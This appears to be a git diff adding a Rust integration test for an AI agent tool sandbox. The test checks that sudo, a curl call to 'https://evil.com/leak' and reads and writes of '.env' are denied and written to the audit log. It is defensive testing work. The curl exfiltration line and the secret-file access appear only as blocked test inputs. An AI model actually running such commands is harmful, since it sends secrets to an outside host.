@@ -1,3 +1,15 @@
+use std::sync::Arc;
+use tempfile::tempdir;
+use uuid::Uuid;
+
+use nexus_albaai::checkpoints::sqlite::SqliteCheckpointStore;
+use nexus_albaai::checkpoints::store::CheckpointStore;
+use nexus_albaai::checkpoints::types::ExecutionPolicyRecord;
+use nexus_albaai::domain::{ActionIntentKind, ApprovalRequest, ApprovalStatus, ExecutionScope};
+use nexus_albaai::server::create_app;
+use nexus_albaai::server::state::AppState;
+use nexus_albaai::tools::register_workspace_tools_with_audit;
+use nexus_albaai::tools::types::{ToolError, ToolRegistry};
 use nexus_albaai::verification::policy::{ExecutionPolicyEngine, PolicyDecision, PolicyTarget};
 
 struct TestCase {
@@ -501,4 +513,188 @@ fn test_execution_policy_table_all_rules() {
             failures.join("\n")
         );
     }
+}
+
+#[tokio::test]
+async fn test_policy_settings_api_and_tool_wiring() {
+    let ws = tempdir().unwrap();
+    let db_path = ws.path().join("policy_wiring.db");
+    let store = Arc::new(SqliteCheckpointStore::new(&db_path).unwrap());
+
+    let app_state = AppState::new(store.clone(), ws.path().to_path_buf());
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    tokio::spawn(async move {
+        axum::serve(listener, create_app(app_state)).await.unwrap();
+    });
+
+    let client = reqwest::Client::new();
+    let auth_resp = client
+        .post(format!("http://{}/api/v1/auth/local-session", addr))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(auth_resp.status(), reqwest::StatusCode::OK);
+    let auth_json: serde_json::Value = auth_resp.json().await.unwrap();
+    let token = auth_json["access_token"].as_str().unwrap().to_string();
+
+    let get_resp = client
+        .get(format!("http://{}/api/v1/settings/execution-policy", addr))
+        .header("Authorization", format!("Bearer {}", token))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(get_resp.status(), reqwest::StatusCode::OK);
+    let initial_policy: ExecutionPolicyRecord = get_resp.json().await.unwrap();
+    assert_eq!(initial_policy.default_mode, "ask");
+
+    let mut allow_policy = initial_policy.clone();
+    allow_policy.default_mode = "allow".to_string();
+    let put_allow_resp = client
+        .put(format!("http://{}/api/v1/settings/execution-policy", addr))
+        .header("Authorization", format!("Bearer {}", token))
+        .json(&allow_policy)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(put_allow_resp.status(), reqwest::StatusCode::OK);
+
+    let mut registry = ToolRegistry::new();
+    register_workspace_tools_with_audit(&mut registry, ws.path(), None, Some(store.clone()));
+
+    let echo_args = serde_json::json!({
+        "program": "echo",
+        "args": ["hi"]
+    });
+    assert_eq!(
+        registry.check_policy("run_command", &echo_args),
+        Some(PolicyDecision::Allow)
+    );
+
+    let cron_args = serde_json::json!({
+        "program": "crontab",
+        "args": ["-l"]
+    });
+    assert_eq!(
+        registry.check_policy("run_command", &cron_args),
+        Some(PolicyDecision::Ask)
+    );
+
+    let hooks_args = serde_json::json!({
+        "program": "git",
+        "args": ["config", "core.hooksPath", "/etc/hooks"]
+    });
+    assert_eq!(
+        registry.check_policy("run_command", &hooks_args),
+        Some(PolicyDecision::Ask)
+    );
+
+    let mut new_policy = initial_policy.clone();
+    new_policy.default_mode = "strict".to_string();
+    new_policy.denied_domains = vec!["evil.com".to_string()];
+    let put_resp = client
+        .put(format!("http://{}/api/v1/settings/execution-policy", addr))
+        .header("Authorization", format!("Bearer {}", token))
+        .json(&new_policy)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(put_resp.status(), reqwest::StatusCode::OK);
+
+    let verify_get = client
+        .get(format!("http://{}/api/v1/settings/execution-policy", addr))
+        .header("Authorization", format!("Bearer {}", token))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(verify_get.status(), reqwest::StatusCode::OK);
+    let updated: ExecutionPolicyRecord = verify_get.json().await.unwrap();
+    assert_eq!(updated.default_mode, "strict");
+    assert_eq!(updated.denied_domains, vec!["evil.com".to_string()]);
+
+    assert_eq!(
+        registry.check_policy("run_command", &echo_args),
+        Some(PolicyDecision::Ask)
+    );
+
+    let sudo_args = serde_json::json!({
+        "program": "sudo",
+        "args": ["apt-get", "update"]
+    });
+    assert_eq!(
+        registry.check_policy("run_command", &sudo_args),
+        Some(PolicyDecision::Deny)
+    );
+
+    let scope = ExecutionScope::new(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4()).unwrap();
+    let cmd_tool = registry.get("run_command").unwrap();
+
+    let sudo_res = cmd_tool.execute(&scope, &sudo_args).await;
+    assert!(sudo_res.is_err());
+    match sudo_res.unwrap_err() {
+        ToolError::AccessDenied(msg) => {
+            assert!(msg.contains("blocked by execution policy"));
+        }
+        other => panic!("Expected AccessDenied, got {:?}", other),
+    }
+
+    let logs = store.list_audit_logs(&scope).await.unwrap();
+    assert!(logs.iter().any(|l| l.action == "sandbox.command_blocked"));
+
+    let approval_req = ApprovalRequest {
+        id: Uuid::new_v4(),
+        scope,
+        tool_name: "run_command".to_string(),
+        action_description: "sudo apt-get update".to_string(),
+        intent: ActionIntentKind::DestructiveCommand,
+        status: ApprovalStatus::AllowedOnce,
+        author_id: None,
+        created_at: chrono::Utc::now(),
+        decided_at: Some(chrono::Utc::now()),
+        decided_by: Some("human".to_string()),
+        consumed_at: None,
+    };
+    store.save_approval(&approval_req).await.unwrap();
+
+    assert_eq!(
+        registry.check_policy("run_command", &sudo_args),
+        Some(PolicyDecision::Deny)
+    );
+    let post_approve_res = cmd_tool.execute(&scope, &sudo_args).await;
+    assert!(post_approve_res.is_err());
+
+    let curl_args = serde_json::json!({
+        "program": "curl",
+        "args": ["https://evil.com/leak"],
+        "allow_network": true
+    });
+    let curl_res = cmd_tool.execute(&scope, &curl_args).await;
+    assert!(curl_res.is_err());
+    let logs_after_net = store.list_audit_logs(&scope).await.unwrap();
+    assert!(logs_after_net
+        .iter()
+        .any(|l| l.action == "sandbox.network_blocked"));
+
+    let read_tool = registry.get("read_file").unwrap();
+    let env_read_args = serde_json::json!({
+        "path": ".env"
+    });
+    let read_res = read_tool.execute(&scope, &env_read_args).await;
+    assert!(read_res.is_err());
+    let logs_after_read = store.list_audit_logs(&scope).await.unwrap();
+    assert!(logs_after_read
+        .iter()
+        .any(|l| l.action == "sandbox.read_blocked"));
+
+    let write_tool = registry.get("write_file").unwrap();
+    let env_write_args = serde_json::json!({
+        "path": ".env",
+        "content": "SECRET=123"
+    });
+    let write_res = write_tool.execute(&scope, &env_write_args).await;
+    assert!(write_res.is_err());
+    let logs_after_write = store.list_audit_logs(&scope).await.unwrap();
+    assert!(logs_after_write
+        .iter()
+        .any(|l| l.action == "sandbox.write_blocked"));
 }
